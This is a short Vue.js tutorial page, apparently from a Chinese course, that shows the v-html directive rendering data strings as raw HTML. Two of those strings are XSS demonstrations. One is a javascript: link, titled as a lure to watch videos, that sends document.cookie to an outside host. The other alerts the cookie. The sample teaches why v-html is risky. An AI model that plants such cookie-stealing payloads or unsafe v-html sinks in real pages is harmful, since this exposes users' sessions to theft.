<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>v-html指令</title>
    <!-- 引入Vue-->
    <script type="text/javascript" src="../js/Vue.js"></script>
  </head>
  <body>
    <div id="root">
      <div>你好,{{name}}</div>
      <div v-html="str">你好,</div>
      <div v-html="str2">你好,</div>
      <div v-html="str3">你好,</div>
    </div>

    <script type="text/javascript">
      Vue.config.productionTip = false // 阻止 vue 在启动时生成生产提示

      const vm = new Vue({
        el: '#root',
        data: {
          name: '尚硅谷',
          str: '<h2>你好,我是孙笑川</h2>',
          str2: '<a href=javascript:location.href="http://www.baidu.com?" + document.cookie> 点我看片</a>',
          str3: '<a href=javascript:alert(document.cookie)> 点我'
        }
      })
    </script>
  </body>
</html>
